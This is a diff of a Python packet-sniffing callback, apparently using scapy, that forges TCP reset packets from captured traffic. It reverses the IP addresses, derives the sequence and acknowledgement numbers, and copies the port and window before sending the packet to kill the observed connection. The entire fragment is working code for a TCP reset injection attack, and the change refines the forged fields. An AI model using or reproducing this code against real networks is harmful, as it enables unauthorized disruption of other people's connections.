@@ -15,14 +15,12 @@ def pkt_callback(packet):
             resetPkt[TCP].flags = 'R'
             #the seq number should be whatever was last acked
             #the ack number should be whatever the last seq was + len of data
-            seq = packet[TCP].ack
-            ack = packet[TCP].seq + len(packet[TCP])-32
-            dst = packet[IP].dst
-            src = packet[IP].src
-            resetPkt[TCP].seq = seq
-            resetPkt[TCP].ack = ack
-            resetPkt[IP].src = dst
-            resetPkt[IP].dst = src
+            resetPkt[TCP].dport = packet[TCP].dport
+            resetPkt[TCP].window = packet[TCP].window
+            resetPkt[TCP].seq = packet[TCP].ack
+            resetPkt[TCP].ack = packet[TCP].seq + len(packet[TCP])-32
+            resetPkt[IP].src = packet[IP].dst
+            resetPkt[IP].dst = packet[IP].src
             resetPkt.show()
             send(resetPkt)
 
